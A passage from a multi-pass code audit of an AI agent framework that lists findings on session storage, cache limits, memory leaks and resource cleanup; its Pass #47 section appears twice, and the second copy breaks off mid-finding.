**File:** `gateway/session.py:695–719` (`_ensure_loaded_locked`)
**Severity:** MEDIUM
**Issue:** When `sessions.json` is corrupted, `_ensure_loaded_locked()` catches the exception and falls back to an empty `self._entries = {}` dict. There is no backup file, no recovery path, and no user notification. If `sessions.json` is corrupted, all session history is silently lost.

**Recommendation:** Maintain a `sessions.json.bak` backup. On corruption, offer to restore from backup or preserve the corrupted file for manual recovery.

---

### P46-4 · SessionStore.prune_old_entries holds lock during entire prune iteration — MEDIUM

**File:** `gateway/session.py:1061–1085` (prune_old_entries)
**Severity:** MEDIUM
**Issue:** The prune loop holds `self._lock` for the entire iteration — including the `has_active_processes_fn` callback for each session and the I/O of `_save()`. Under high session count, this creates a long lock hold time that blocks all other session access.

**Recommendation:** Move the lock to protect only the `self._entries` mutations, not the processing loop.

---

### P46-5 · Cache invalidation on config change is not enforced — MEDIUM

**File:** `hermes_cli/config.py` (config reload), `agent/skill_utils.py`, `tools/registry.py`
**Severity:** MEDIUM
**Issue:** The skill cache (`_EXTERNAL_DIRS_CACHE`), tool registry cache, and other caches do not subscribe to config change events. If the user changes `skills.directories` or `tools.disabled`, the cache may serve stale data until TTL or process restart.

**Recommendation:** Add cache invalidation callbacks to config change handlers.

---

### P46-6 · hermes_state.py message store token accounting may drift — LOW

**File:** `hermes_state.py` (append_message, token accounting)
**Severity:** LOW
**Issue:** Token counts are computed at insert time using a tokenizer. If the tokenizer changes between versions, the stored token counts become inaccurate. No reconciliation or recount process exists.

**Recommendation:** Store message content alongside token counts; periodically verify token totals against recomputation.

---

### P46-7 · Tool registry has no TTL or size cap on cached tool schemas — LOW

**File:** `tools/registry.py` (tool schema cache)
**Severity:** LOW
**Issue:** Tool schemas are cached at registration time with no TTL and no size cap. If many plugins register tools, the schema cache grows without bound. No LRU eviction or TTL cleanup.

**Recommendation:** Add an LRU cache with `maxsize` for tool schemas, or add TTL-based invalidation.

---

### P46-8 · Feishu LRU dedup cache uses 24h TTL — delayed duplicate detection — LOW

**File:** `gateway/platforms/feishu.py:229` (`_FEISHU_BOT_MSG_TRACK_SIZE = 512`), lines ~2968
**Severity:** LOW
**Issue:** The Feishu message deduplication LRU cache has a 24-hour TTL. Messages delayed longer than 24h (e.g., retry after outage) would be reprocessed as new messages, potentially causing duplicate agent responses.

**Recommendation:** Consider a longer TTL or persistent dedup store for high-availability scenarios.

---

### P46-9 · Agent cache LRU eviction logic walks entire LRU order on each prune — MEDIUM

**File:** `gateway/run.py:15088–15141` (agent session LRU eviction)
**Severity:** MEDIUM
**Issue:** The LRU eviction code walks the entire LRU order to find evictable entries. With many sessions, this is O(n) per eviction check. The comment at line 15088 acknowledges this: "Walk LRU → MRU and evict excess-LRU entries that aren't mid-turn."

**Recommendation:** Maintain a separate index or use an ordered dict (e.g., `collections.OrderedDict`) to make eviction O(1).

---

### P46-10 · Config file watcher not implemented — external changes not detected — LOW

**File:** `hermes_cli/config.py`
**Severity:** LOW
**Issue:** There is no config file watcher (no `watchdog` or `inotify` equivalent). If the config file is modified externally (e.g., by another hermes instance or a manual edit), the running agent does not detect the change and continues with stale config.

**Recommendation:** Use `watchdog` or periodic stat() polling to detect external config changes and trigger reload.

---

### P46-11 · Skill cache uses mtime only — sub-second modification attacks possible — LOW

**File:** `agent/skill_utils.py` (_EXTERNAL_DIRS_CACHE)
**Severity:** LOW
**Issue:** External skill directories are cached by mtime. If a skilled attacker can modify a skill file within the same second as the cached mtime, they could serve stale cached content, or conversely, a file modified within the same second as the cache entry could be served as fresh.

**Recommendation:** Use inode+device+mtime triple, or use a content hash for cache validation.

---

### P46-12 · Checkpoint retention_days defaults to 7 — too aggressive for some use cases — INFO

**File:** `tools/checkpoint_manager.py:1462` (`maybe_auto_prune_checkpoints`)
**Severity:** INFO
**Issue:** The default `retention_days=7` for checkpoint pruning may be too aggressive for users who need historical checkpoints for debugging or rollback. No warning is emitted when pruning happens.

**Recommendation:** Make the default more conservative (e.g., 30 days) and add a WARNING log when checkpoints are pruned.

---

### P46-13 · SessionStore._save() uses lock but file write is not atomic — LOW

**File:** `gateway/session.py:721–742` (_save)
**Severity:** LOW
**Issue:** `_save()` writes to `sessions.json` directly, not via a temporary file + atomic rename. If the process crashes mid-write, `sessions.json` could be left in a corrupted/truncated state. (Already noted P40-1/P46-3 but the underlying mechanism is the same.)

**Recommendation:** Write to `sessions.json.tmp` then atomic rename to `sessions.json`.

---

### P46-14 · i18n lru_cache has maxsize=1 — config reload inefficiency — INFO

**File:** `agent/i18n.py:166` (`@lru_cache(maxsize=1)`)
**Severity:** INFO
**Issue:** The i18n locale cache has `maxsize=1`. When the user changes locale, the cache must be explicitly cleared or it will serve the old locale for one more request. No cache key includes locale variant.

**Recommendation:** Use `maxsize=None` or key the cache by locale variant.

---

### P46-15 · API server LRU store has no size cap — memory growth — LOW

**File:** `gateway/platforms/api_server.py:323` (SQLite-backed LRU store), lines ~564
**Severity:** LOW
**Issue:** The API server's in-memory idempotency cache with LRU semantics has no documented size cap. Under high request volume, it could grow to consume significant memory.

**Recommendation:** Add a `maxsize` parameter and bound the LRU.

---

### Summary Table

| ID | Severity | Issue |
|----|----------|-------|
| P46-1 | MEDIUM | WAL auto-checkpoint only PASSIVE — no proactive size cap |
| P46-2 | MEDIUM | VACUUM runs synchronously — blocks event loop |
| P46-3 | MEDIUM | sessions.json corruption — silent fallback to empty dict |
| P46-4 | MEDIUM | prune_old_entries holds lock during entire iteration |
| P46-5 | MEDIUM | Cache invalidation not tied to config change events |
| P46-6 | LOW | Token accounting may drift on tokenizer change |
| P46-7 | LOW | Tool registry cache has no TTL or size cap |
| P46-8 | LOW | Feishu dedup cache 24h TTL — delayed duplicates |
| P46-9 | MEDIUM | LRU eviction walks entire session list O(n) |
| P46-10 | LOW | Config file watcher not implemented |
| P46-11 | LOW | Skill cache mtime-only — sub-second modification window |
| P46-12 | INFO | Checkpoint retention default 7 days — may be aggressive |
| P46-13 | LOW | sessions.json write not atomic |
| P46-14 | INFO | i18n lru_cache maxsize=1 — config reload inefficiency |
| P46-15 | LOW | API server LRU store has no size cap |

**New findings this pass:** 15 (6 MEDIUM, 6 LOW, 3 INFO)

---

## Summary Table (Passes #24–46)

| Pass | Strategy | New Issues | Running Total |
|------|----------|------------|---------------|
| #24 | Data Persistence & State Management | 16 | ~416 |
| #25 | Dependency & Import Graph | 15 | ~431 |
| #26 | Tool-Call Patterns & Schema Validation | 23 | ~454 |
| #27 | Cross-File Signature & Contract Inconsistency | 16 | ~470 |
| #28 | Adversarial Input Fuzzing | 8 | ~478 |
| #29 | State Machine & Lifecycle Consistency | 10 | ~488 |
| #30 | Architectural & Agentic Coding Review | 12 | ~500 |
| #31 | Concurrency & Parallelism Deep Dive | 7 | ~507 |
| #32 | Data Flow / Taint Analysis | 0 | ~507 |
| #33 | Performance & Efficiency Deep Dive | 0 | ~507 |
| #34 | Control Flow Re-Analysis | 3 | ~510 |
| #35 | Cross-File Consistency Deep Dive (Round 2) | 4 | ~514 |
| #36 | Dependency & Import Graph Deep Dive (Round 2) | 9 | ~523 |
| #37 | Line-by-Line Lexical Scan (Adversarial Round) | 10 | ~533 |
| #38 | Phase 2 Adversarial: Worst-Case Runtime | 7 | ~540 |
| #39 | Tool-Call Specific Deep Scan (Round 2) | 9 | ~549 |
| #40 | Gateway & Platform Adapter Deep Dive | 15 | ~564 |
| #41 | Error Handling & Observability Deep Dive | 15 | ~579 |
| #42 | Security Audit: SSRF, Command Injection | 10 | ~589 |
| #43 | TUI Gateway & Interactive Terminal Audit | 23 | ~612 |
| #44 | Plugin System & Skills Ecosystem | 15 | ~627 |
| #45 | CLI & Configuration System Deep Dive | 15 | ~642 |
| #46 | Data Storage, Serialization & Cache Layer | 15 | ~657 |

**Critical issues across all passes:**
- Skill file integrity (P30-3, P44-7): No SHA256 or signing
- Plugin sandbox (P44-3): No syscall-level isolation
- Plugin signing (P44-1): No cryptographic attestation
- Memory provider prefetch injection (P30-6): Model output in tool args
- Plugin config write (P23-5): Write without read confirmation
- Hook sandbox (P23-1): No restrictions on hook capabilities
- pre_gateway_dispatch auth bypass (P23-4): Request without headers
- No shutdown in PluginManager (P29-9, P44-4): Tool leak across restarts
- coerce_tool_args no length limit (P38-6): Memory exhaustion
- subprocess.run without timeout (P38-2, P45-1-5): Indefinite blocking
- save_config silent failure (P27-1, P45-6-8): No user feedback

**Audit ongoing — more passes to follow.**

*Last updated: 2026-05-25T04:30:00Z*
*Commit at scan: b04760fdb*


---

## Pass #47 – Memory Management, Resource Limits & Leak Detection – 2026-05-24T23:30:00Z

*Note: This pass was conducted against commit 5b52e26d1 (origin/main) which is slightly ahead of our scan commit b04760fdb. Findings are still valid as the codebase between the two commits is consistent.*

## 1. MEMORY LEAK PATTERNS

### FINDING P47-001: Feishu `_sent_message_id_order` is dead code — never used
**File**: `gateway/platforms/feishu.py` (lines 1449-1450, 229)
**Severity**: Medium
**Pattern**: Unused global variable + unbounded list potential

```python
_Feishu_BOT_MSG_TRACK_SIZE = 512                   # LRU size for tracking sent message IDs
# ...
self._sent_message_ids_to_chat: Dict[str, str] = {}  # message_id → chat_id
self._sent_message_id_order: List[str] = []  # LRU order for _sent_message_ids_to_chat
```

**Issue**: `_sent_message_id_order` is declared and `_FEISHU_BOT_MSG_TRACK_SIZE` is set to 512, but a grep across the entire feishu.py file shows **zero references** to `_sent_message_id_order` after declaration (no appends, no pops, no membership checks, no len() calls). The list is completely dead code.

Additionally, `_FEISHU_BOT_MSG_TRACK_SIZE` is also unused — nothing enforces the 512 cap since the list it was meant to bound is never touched.

**Assessment**: The LRU list pattern appears to have been started (list + constant declared) but never completed. The companion dict `_sent_message_ids_to_chat` is used (for reaction routing based on message_id → chat_id lookup), but its LRU order tracking list is not. This is a code smell but not an active memory leak since the list is never populated.

**Action**: Either implement the LRU tracking properly (using `OrderedDict` like `_pending_processing_reactions`), or remove the dead `_sent_message_id_order` and the unused `_FEISHU_BOT_MSG_TRACK_SIZE` constant.

---

### FINDING P47-002: Feishu `_pending_processing_reactions` LRU uses correct OrderedDict pattern (positive)
**File**: `gateway/platforms/feishu.py` (line 1469, 2934-2939)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: Proper bounded LRU via OrderedDict

```python
self._pending_processing_reactions: "OrderedDict[str, str]" = OrderedDict()
```

The LRU cache in feishu is correctly implemented with `move_to_end()` on access and `popitem(last=False)` to evict the oldest entry when over `_FEISHU_PROCESSING_REACTION_CACHE_SIZE`. This is the reference implementation that `_sent_message_id_order` should mirror.

---

### FINDING P47-003: OpenRouter pre-warm thread leak guard (positive)
**File**: `run_agent.py` (lines 211-215)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: Module-level threading.Event guard prevents repeated thread spawn

```python
_openrouter_prewarm_done = threading.Event()
```

**Issue (none)**: This is a correctly implemented singleton guard. When `AIAgent.__init__` checks `_openrouter_prewarm_done` before spawning the pre-warm thread, it prevents a long-running gateway process from leaking one OS thread per incoming message. Confirmed as a best-practice pattern.

---

## 2. RESOURCE LIMITS ENFORCEMENT

### FINDING P47-004: Agent cache LRU enforcement — correctly handles mid-turn agents
**File**: `gateway/run.py` (lines 15160-15229)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: LRU eviction with mid-turn protection

The `_enforce_agent_cache_cap()` method correctly:
- Uses `id()` lookup on `_running_agents` to detect mid-turn agents without relying on `AIAgent.__eq__` (which MagicMock overrides in tests)
- Skips eviction of mid-turn agents without compensating by evicting newer entries (avoids penalising freshly-inserted sessions)
- Logs a warning when all excess LRU slots are held by mid-turn agents, with the cache temporarily staying over cap
- Schedules cleanup on daemon threads so the cache lock is not held during teardown

**Status**: Solid implementation.

---

### FINDING P47-005: `_AGENT_CACHE_MAX_SIZE = 128` with idle TTL eviction
**File**: `gateway/run.py` (lines 64-65)
**Severity**: Informational — WELL IMPLEMENTED

```python
_AGENT_CACHE_MAX_SIZE = 128
_AGENT_CACHE_IDLE_TTL_SECS = 3600.0  # evict agents idle for >1h
```

The `_session_expiry_watcher()` runs every 300s and evicts agents idle > 1h regardless of session reset policy. This prevents cached AIAgents from pinning memory for the gateway's entire lifetime.

---

### FINDING P47-006: ProcessRegistry MAX_PROCESSES = 64 with LRU pruning
**File**: `tools/process_registry.py` (lines 58-60, 1314-1339)
**Severity**: Informational — WELL IMPLEMENTED

```python
MAX_OUTPUT_CHARS = 200_000      # 200KB rolling output buffer
FINISHED_TTL_SECONDS = 1800     # Keep finished processes for 30 minutes
MAX_PROCESSES = 64              # Max concurrent tracked processes (LRU pruning)
```

`_prune_if_needed()` correctly:
- Evicts expired finished sessions by TTL first
- Then evicts oldest finished session if still over `MAX_PROCESSES`
- Cleans up stale `_completion_consumed` entries to prevent set growth
- Called atomically under `_lock` on every spawn path (lines 574, 625, 726)

---

### FINDING P47-007: Watch pattern rate limiting — circuit breaker (positive)
**File**: `tools/process_registry.py` (lines 62-75)
**Severity**: Informational — WELL IMPLEMENTED

```python
WATCH_MIN_INTERVAL_SECONDS = 15   # Minimum spacing between consecutive watch matches
WATCH_STRIKE_LIMIT = 3            # Strikes in a row → disable watch + promote to notify_on_complete
WATCH_GLOBAL_MAX_PER_WINDOW = 15   # Global circuit breaker across all sessions
WATCH_GLOBAL_WINDOW_SECONDS = 10
WATCH_GLOBAL_COOLDOWN_SECONDS = 30
```

Multi-layer rate limiting: per-session cooldown + strike limit + global circuit breaker prevents sibling processes from collectively flooding the user.

---

### FINDING P47-008: IterationBudget thread-safe consume/refund (positive)
**File**: `agent/iteration_budget.py` (lines 32-59)
**Severity**: Informational — WELL IMPLEMENTED

```python
def consume(self) -> bool:
    with self._lock:
        if self._used >= self.max_total:
            return False
        self._used += 1
        return True
```

Thread-safe, returns False when exhausted, with refund support for `execute_code` turns. Confirmed as solid.

---

### FINDING P47-009: `release_clients()` vs `close()` distinction — correctly implemented
**File**: `run_agent.py` (lines 2052-2130)
**Severity**: Informational — WELL IMPLEMENTED

The critical distinction:
- `release_clients()` — soft cleanup for cache eviction; preserves process_registry entries, terminal sandboxes, browser daemons, and memory providers. Only closes OpenAI/httpx client + active child agents.
- `close()` — hard teardown for session boundaries; kills everything including process_registry entries and sandboxes.

This is correctly implemented and prevents cache eviction from killing user's background shells.

---

### FINDING P47-010: `AIAgent.close()` properly cleans up all resources
**File**: `run_agent.py` (lines 2099-2130)
**Severity**: Informational — WELL IMPLEMENTED

The `close()` method correctly:
1. Kills background processes via `process_registry.kill_all(task_id=task_id)`
2. Cleans terminal sandbox environments via `cleanup_vm(task_id)`
3. Cleans browser daemon sessions via `cleanup_browser(task_id)`
4. Closes active child agents
5. Closes OpenAI/httpx client connections

Each step is independently guarded with `try/except Exception: pass` so a failure in one does not prevent the rest.

---

## 3. BACKGROUND TASK CLEANUP

### FINDING P47-011: Slack Socket Mode zombie connection prevention
**File**: `gateway/platforms/slack.py` (lines 552-556)
**Severity**: Informational — WELL IMPLEMENTED

```python
# Close any previous handler before creating a new one so that
# calling connect() a second time (e.g. during a gateway restart or
# in-process reconnect attempt) does not leave a zombie Socket Mode
# connection alive.
```

Correctly closes previous handler before creating a new one to prevent double-dispatch and zombie connections.

---

### FINDING P47-012: Docker init process reaps zombie children (positive)
**File**: `tools/environments/docker.py` (line 508)
**Severity**: Informational — WELL IMPLEMENTED

```python
"--init",           # tini/catatonit as PID 1 — reaps zombie children
```

Docker container uses `--init` so PID 1 is catatonit/tini which reaps zombie processes. This is correct.

---

### FINDING P47-013: Cron scheduler cleans up httpx clients after worker thread death
**File**: `cron/scheduler.py` (lines 1779-1782)
**Severity**: Informational — WELL IMPLEMENTED

```python
# Each cron run spins up a short-lived worker thread whose event loop
# dies as soon as the ``ThreadPoolExecutor`` shuts down. Any async
# httpx clients cached under that loop are now unusable — reap them
# so their transports don't accumulate in the process-global cache.
```

The cron scheduler correctly cleans up async httpx clients that would otherwise accumulate when the per-run ThreadPoolExecutor shuts down.

---

## 4. MEMORY PRESSURE RESPONSE

### FINDING P47-014: No explicit memory pressure detection / GC trigger
**File**: `gateway/run.py`, `run_agent.py`
**Severity**: Low — design observation

No explicit `psutil` memory pressure monitoring or `gc.collect()` triggers anywhere in the codebase. The only memory management is LRU + TTL eviction in the agent cache and ProcessRegistry pruning.

**Assessment**: Python's default GC (generational) is likely sufficient for the workload. However, in extremely long-running gateway processes with many session churns, explicit memory pressure monitoring could be a future improvement. Current design relies on LRU/TTL to bound memory.

---

### FINDING P47-015: `_sweep_idle_cached_agents` correctly skips mid-turn agents
**File**: `gateway/run.py` (lines 15231-15260)
**Severity**: Informational — WELL IMPLEMENTED

The idle TTL sweeper correctly:
- Builds `running_ids` set from `_running_agents` to skip mid-turn agents
- Uses `id()` lookup to avoid AIAgent `__eq__` issues
- Schedules cleanup on daemon threads (non-blocking)
- Evicts under lock but cleanup is async

---

## 5. FILE DESCRIPTOR LEAKS

### FINDING P47-016: `close()` idempotency prevents double-close FD leaks
**File**: `run_agent.py` (line 2109)
**Severity**: Informational — CORRECTLY HANDLED

```python
# Safe to call multiple times (idempotent).
```

The `close()` method is explicitly documented as idempotent. Each cleanup step is independently guarded, so calling close() multiple times will not cause issues.

---

### FINDING P47-017: ProcessRegistry reader threads — no explicit join() on shutdown
**File**: `tools/process_registry.py`
**Severity**: Low — potential concern

Reader threads (`_reader_thread`) are started for each process but there is no explicit `join()` in the `kill()` or `kill_all()` paths. Threads are daemonic (implicitly) in the reader closure, but the `_reader_thread` field is stored on the `ProcessSession` dataclass and the reader is started with `reader.start()`. If a process is killed before the reader thread naturally exits, the thread may continue until the pipe is closed.

**Assessment**: Low severity since threads are short-lived (bound to pipe EOF), but proper join on explicit kill would be more robust.

---

## 6. TOKEN / STATEMENT BUDGET ENFORCEMENT

### FINDING P47-018: Iteration budget — enforced at loop entry, one grace call
**File**: `run_agent.py` (lines 123-128 in AGENTS.md)
**Severity**: Informational — WELL IMPLEMENTED

```python
while (api_call_count < self.max_iterations and self.iteration_budget.remaining > 0) \
        or self._budget_grace_call:
```

The loop condition correctly combines `api_call_count < max_iterations` with `iteration_budget.remaining > 0`. One grace call is allowed via `_budget_grace_call` after budget exhaustion. The `IterationBudget.consume()` returns `False` when exhausted.

---

### FINDING P47-019: Subagent iteration budget is independent (per-agent, not global)
**File**: `agent/iteration_budget.py` (lines 23-26)
**Severity**: Informational — CORRECT BY DESIGN

```python
# Each subagent gets an independent budget capped at
# ``delegation.max_iterations`` (default 50) — this means total
# iterations across parent + subagents can exceed the parent's cap.
```

This is documented and intentional. Users control per-subagent limits via `delegation.max_iterations` in config.yaml. This is not a bug.

---

## SUMMARY

| Category | Finding | Severity | Status |
|----------|---------|----------|--------|
| Memory leak — Feishu `_sent_message_id_order` dead code | P47-001 | Medium | Needs fix: implement LRU or remove dead code |
| Feishu `_pending_processing_reactions` LRU (reference impl) | P47-002 | Informational | Well implemented |
| OpenRouter pre-warm thread leak guard | P47-003 | Informational | Well implemented |
| Agent cache LRU with mid-turn protection | P47-004 | Informational | Well implemented |
| Agent cache MAX_SIZE=128 + idle TTL | P47-005 | Informational | Well implemented |
| ProcessRegistry MAX_PROCESSES=64 + pruning | P47-006 | Informational | Well implemented |
| Watch pattern rate limiting + circuit breaker | P47-007 | Informational | Well implemented |
| IterationBudget thread-safe consume/refund | P47-008 | Informational | Well implemented |
| release_clients() vs close() distinction | P47-009 | Informational | Well implemented |
| AIAgent.close() idempotent resource cleanup | P47-010 | Informational | Well implemented |
| Slack Socket Mode zombie prevention | P47-011 | Informational | Well implemented |
| Docker init reaps zombies | P47-012 | Informational | Well implemented |
| Cron httpx client cleanup after worker death | P47-013 | Informational | Well implemented |
| No explicit memory pressure / GC trigger | P47-014 | Low | Design observation |
| Idle agent sweeper with mid-turn protection | P47-015 | Informational | Well implemented |
| close() idempotency prevents FD leaks | P47-016 | Informational | Well implemented |
| Reader threads — no explicit join() on kill | P47-017 | Low | Minor robustness gap |
| Iteration budget enforced at loop entry | P47-018 | Informational | Well implemented |
| Subagent budget independent (by design) | P47-019 | Informational | Correct by design |

**Total: 19 findings**
- Critical issues: 0
- Medium issues: 1 (P47-001 — Feishu unbounded LRU list)
- Low issues: 2 (P47-014, P47-017)
- Informational/positive: 16

---

*Generated by Pass #47 audit — Memory Management, Resource Limits & Leak Detection*

**New findings this pass:** 19 (1 Medium, 2 Low, 16 Info/Positive)

*Pass #47 complete.*


---

## Pass #47 – Memory Management, Resource Limits & Leak Detection – 2026-05-24T23:30:00Z

*Note: This pass was conducted against commit 5b52e26d1 (origin/main) slightly ahead of scan commit b04760fdb. Findings are still valid.*

## 1. MEMORY LEAK PATTERNS

### FINDING P47-001: Feishu `_sent_message_id_order` is dead code — never used
**File**: `gateway/platforms/feishu.py` (lines 1449-1450, 229)
**Severity**: Medium
**Pattern**: Unused global variable + unbounded list potential

```python
_Feishu_BOT_MSG_TRACK_SIZE = 512                   # LRU size for tracking sent message IDs
# ...
self._sent_message_ids_to_chat: Dict[str, str] = {}  # message_id → chat_id
self._sent_message_id_order: List[str] = []  # LRU order for _sent_message_ids_to_chat
```

**Issue**: `_sent_message_id_order` is declared and `_FEISHU_BOT_MSG_TRACK_SIZE` is set to 512, but a grep across the entire feishu.py file shows **zero references** to `_sent_message_id_order` after declaration (no appends, no pops, no membership checks, no len() calls). The list is completely dead code.

Additionally, `_FEISHU_BOT_MSG_TRACK_SIZE` is also unused — nothing enforces the 512 cap since the list it was meant to bound is never touched.

**Assessment**: The LRU list pattern appears to have been started (list + constant declared) but never completed. The companion dict `_sent_message_ids_to_chat` is used (for reaction routing based on message_id → chat_id lookup), but its LRU order tracking list is not. This is a code smell but not an active memory leak since the list is never populated.

**Action**: Either implement the LRU tracking properly (using `OrderedDict` like `_pending_processing_reactions`), or remove the dead `_sent_message_id_order` and the unused `_FEISHU_BOT_MSG_TRACK_SIZE` constant.

---

### FINDING P47-002: Feishu `_pending_processing_reactions` LRU uses correct OrderedDict pattern (positive)
**File**: `gateway/platforms/feishu.py` (line 1469, 2934-2939)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: Proper bounded LRU via OrderedDict

```python
self._pending_processing_reactions: "OrderedDict[str, str]" = OrderedDict()
```

The LRU cache in feishu is correctly implemented with `move_to_end()` on access and `popitem(last=False)` to evict the oldest entry when over `_FEISHU_PROCESSING_REACTION_CACHE_SIZE`. This is the reference implementation that `_sent_message_id_order` should mirror.

---

### FINDING P47-003: OpenRouter pre-warm thread leak guard (positive)
**File**: `run_agent.py` (lines 211-215)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: Module-level threading.Event guard prevents repeated thread spawn

```python
_openrouter_prewarm_done = threading.Event()
```

**Issue (none)**: This is a correctly implemented singleton guard. When `AIAgent.__init__` checks `_openrouter_prewarm_done` before spawning the pre-warm thread, it prevents a long-running gateway process from leaking one OS thread per incoming message. Confirmed as a best-practice pattern.

---

## 2. RESOURCE LIMITS ENFORCEMENT

### FINDING P47-004: Agent cache LRU enforcement — correctly handles mid-turn agents
**File**: `gateway/run.py` (lines 15160-15229)
**Severity**: Informational — WELL IMPLEMENTED
**Pattern**: LRU eviction with mid-turn protection

The `_enforce_agent_cache_cap()` method correctly:
- Uses `id()` lookup on `_running_agents` to detect mid-turn agents without relying on `AIAgent.__eq__` (which MagicMock overrides in tests)
- Skips eviction of mid-turn agents without compensating by evicting newer entries (avoids penalising freshly-inserted sessions)
- Logs a warning when all excess LRU slots are held by mid-turn agents, with the cache temporarily staying over cap
- Schedules cleanup on daemon threads so the cache lock is not held during teardown

**Status**: Solid implementation.

---

### FINDING P47-005: `_AGENT_CACHE_MAX_SIZE = 128` with idle TTL eviction
**File**: `gateway/run.py` (lines 64-65)
**Severity**: Informational — WELL IMPLEMENTED

```python
_AGENT_CACHE_MAX_SIZE = 128
_AGENT_CACHE_IDLE_TTL_SECS = 3600.0  # evict agents idle for >1h
```

The `_session_expiry_watcher()` runs every 300s and evicts agents idle > 1h regardless of session reset policy. This prevents cached AIAgents from pinning memory for the gateway's entire lifetime.

---

### FINDING P47-006: ProcessRegistry MAX_PROCESSES = 64 with LRU pruning
**File**: `tools/process_registry.py` (lines 58-60, 1314-1339)
**Severity**: Informational — WELL IMPLEMENTED

```python
MAX_OUTPUT_CHARS = 200_000      # 200KB rolling output buffer
FINISHED_TTL_SECONDS = 1800     # Keep finished processes for 30 minutes
MAX_PROCESSES = 64              # Max concurrent tracked processes (LRU pruning)
```

`_prune_if_needed()` correctly:
- Evicts expired finished sessions by TTL first
- Then evicts oldest finished session if still over `MAX_PROCESSES`
- Cleans up stale `_completion_consumed` entries to prevent set growth
- Called atomically under `_lock` on every spawn path (lines 574, 625, 726)

---

### FINDING P47-007: Watch pattern rate limiting — circuit breaker (positive)
**File**: `tools/process_registry.py` (lines 62-75)
**Severity**: Informational — WELL IMPLEMENTED

```python
WATCH_MIN_INTERVAL_SECONDS = 15   # Minimum spacing between consecutive watch matches
WATCH_STRIKE_LIMIT = 3            # Strikes in a row → disable watch + promote to notify_on_complete
WATCH_GLOBAL_MAX_PER_WINDOW = 15   # Global circuit breaker across all sessions
WATCH_GLOBAL_WINDOW_SECONDS = 10
WATCH_GLOBAL_COOLDOWN_SECONDS = 30
```

Multi-layer rate limiting: per-session cooldown + strike limit + global circuit breaker prevents sibling processes from collectively flooding the user.

---

### FINDING P47-008: IterationBudget thread-safe consume/refund (positive)
**File**: `agent/iteration_budget.py` (lines 32-59)
**Severity**: Informational — WELL IMPLEMENTED

```python
def consume(self) -> bool:
    with self._lock:
        if self._used >= self.max_total:
            return False
        self._used += 1
        return True
```

Thread-safe, returns False when exhausted, with refund support for `execute_code` turns. Confirmed as solid.

---

### FINDING P47-009: `release_clients()` vs `close()` distinction — correctly implemented
**File**: `run_agent.py` (lines 2052-2130)
**Severity**: Informational — WELL IMPLEMENTED

The critical distinction:
- `release_clients()` — soft cleanup for cache eviction; preserves process_registry entries, terminal sandboxes, browser daemons, and memory providers. Only closes OpenAI/httpx client + active child agents.
- `close()` — hard teardown for session boundaries; kills everything including process_registry entries and sandboxes.

This is correctly implemented and prevents cache eviction from killing user's background shells.

---

### FINDING P47-010: `AIAgent.close()` properly cleans up all resources
**File**: `run_agent.py` (lines 2099-2130)
**Severity**: Informational — WELL IMPLEMENTED

The `close()` method correctly:
1. Kills background processes via `process_registry.kill_all(task_id=task_id)`
2. Cleans terminal sandbox environments via `cleanup_vm(task_id)`
3. Cleans browser daemon sessions via `cleanup_browser(task_id)`
4. Closes active child agents
5. Closes OpenAI/httpx client connections

Each step is independently guarded with `try/except Exception: pass` so a failure in one does not prevent the rest.

---

## 3. BACKGROUND TASK CLEANUP

### FINDING P47-011: Slack Socket Mode zombie connection prevention
**File**: `gateway/platforms/slack.py` (lines 552-556)
**Severity**: Informational — WELL IMPLEMENTED

```python
# Close any previous handler before creating a new one so that
# calling connect() a second time (e.g. during a gateway restart or
# in-process reconnect attempt) does not leave a zombie Socket Mode
# connection alive.
```

Correctly closes previous handler before creating a new one to prevent double-dispatch and zombie connections.

---

### FINDING P47-012: Docker init process reaps zombie children (positive)
**File**: `tools/environments/docker.py` (line 508)
**Severity**: Informational — WELL IMPLEMENTED

```python
"--init",           # tini/catatonit as PID 1 — reaps zombie children
```

Docker container uses `--init` so PID 1 is catatonit/tini which reaps zombie processes. This is correct.

---

### FINDING P47-013: Cron scheduler cleans up httpx clients after worker thread death
**File**: `cron/scheduler.py` (lines 1779-1782)
**Severity**: Informational — WELL IMPLEMENTED

```python
# Each cron run spins up a short-lived worker thread whose event loop
# dies as soon as the ``ThreadPoolExecutor`` shuts down. Any async
# httpx clients cached under that loop are now unusable — reap them
# so their transports don't accumulate in the process-global cache.
```

The cron scheduler correctly cleans up async httpx clients that would otherwise accumulate when the per-run ThreadPoolExecutor shuts down.

---

## 4. MEMORY PRESSURE RESPONSE

### FINDING P47-014: No explicit memory pressure detection / GC trigger
**File**: `gateway/run.py`, `run_agent.py`
**Severity**: Low — design observation

No explicit `psutil` memory pressure monitoring or `gc.collect()` triggers anywhere in the codebase. The only memory management is LRU + TTL eviction in the agent cache and ProcessRegistry pruning.

**Assessment**: Python's default GC (generational) is likely sufficient for the workload. However, in extremely long-running gateway processes with many session churns, explicit memory pressure monitoring could be a future improvement. Current design relies on LRU/TTL to bound memory.

---

### FINDING P47-015: `_sweep_idle_cached_agents` correctly skips mid-turn agents
**File**: `gateway/run.py` (lines 15231-15260)
**Severity**: Informational — WELL IMPLEMENTED

The idle TTL sweeper correctly:
- Builds `running_ids` set from `_running_agents` to skip mid-turn agents
- Uses `id()` lookup to avoid AIAgent `__eq__` issues
- Schedules cleanup on daemon threads (non-blocking)
- Evicts under lock but cleanup is async

---

## 5. FILE DESCRIPTOR LEAKS

### FINDING P47-016: `close()` idempotency prevents double-close FD leaks
**File**: `run_agent.py` (line 2109)
**Severity**: Informational — CORRECTLY HANDLED

```python
# Safe to call multiple times (idempotent).
```

The `close()` method is explicitly documented as idempotent. Each cleanup step is independently guarded, so calling close() multiple times will not cause issues.

---

### FINDING P47-017: ProcessRegistry reader threads — no explicit join() on shutdown
**File**: `tools/process_registry.py`
**Severity**: Low — potential concern

Reader threads (`_reader_thread`) are started for each process but there is no explicit `join()` in the `kill()` or `kill_all()` paths. Threads are daemonic (implicitly) in the reader closure, but the `_reader_thread` field is stored on the `ProcessSession` dataclass and the reader is started with `reader.start()`. If a process is killed before the reader thread naturally exits, the thread may continue until the pipe is closed.

**Assessment**: Low severity since threads are short-lived (bound to pipe EOF), but proper join on explicit kill would be more robust.

---

## 6. TOKEN / STATEMENT BUDGET ENFORCEMENT

### FINDING P47-018: Iteration budget — enforced at loop entry, one grace call
**File**: `run_agent.py` (lines 123-128 in AGENTS.md)
